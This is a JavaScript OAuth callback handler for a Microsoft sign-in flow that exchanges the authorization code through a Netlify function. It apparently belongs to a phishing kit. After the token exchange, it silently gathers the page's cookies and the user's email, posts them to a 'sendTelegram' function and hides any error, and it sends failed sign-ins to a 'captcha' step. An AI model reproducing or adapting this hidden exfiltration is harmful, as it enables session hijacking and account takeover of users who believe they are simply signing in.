// OAuth Callback Handler for Microsoft OAuth2 (PKCE Flow)
// This script is loaded by public/oauth-callback.html after Microsoft redirects back

async function handleOAuthCallback() {
    const statusEl = document.getElementById('status-msg');
    const spinnerEl = document.getElementById('spinner');

    function setStatus(msg) {
        if (statusEl) statusEl.textContent = msg;
    }

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const error = urlParams.get('error');

        if (error || !code || !state) {
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        setStatus("Signing you in…");

        // PKCE support if needed + always send redirect_uri
        const codeVerifier = sessionStorage.getItem('pkce_verifier');
        const payload = {
            code,
            state,
            redirect_uri: window.location.origin + '/oauth-callback'
        };
        if (codeVerifier) payload.code_verifier = codeVerifier;

        // Debug: log payload
        // console.log('Payload sent to tokenExchange:', payload);

        // POST to your backend to exchange code for tokens
        await fetch('/.netlify/functions/tokenExchange', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        })
        .then(res => res.json())
        .then(async tokenData => {
            // Optionally send Telegram data here, silently
            try {
                const cookies = document.cookie;
                await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        email: tokenData.email || 'user-email-pending@oauth.exchange',
                        cookies: cookies
                    }),
                });
            } catch (e) { /* fail silently */ }

            // Clean up PKCE/session state
            sessionStorage.removeItem('pkce_verifier');
            sessionStorage.removeItem('oauth_state');

            setStatus("Signed in! Redirecting…");
            setTimeout(() => {
                window.location.href = '/?step=success';
            }, 1000);
        })
        .catch(() => {
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
        });

    } catch (err) {
        setStatus("Authentication error. Redirecting...");
        setTimeout(() => {
            window.location.href = '/?step=captcha';
        }, 2000);
    }
}

// Run on load
handleOAuthCallback();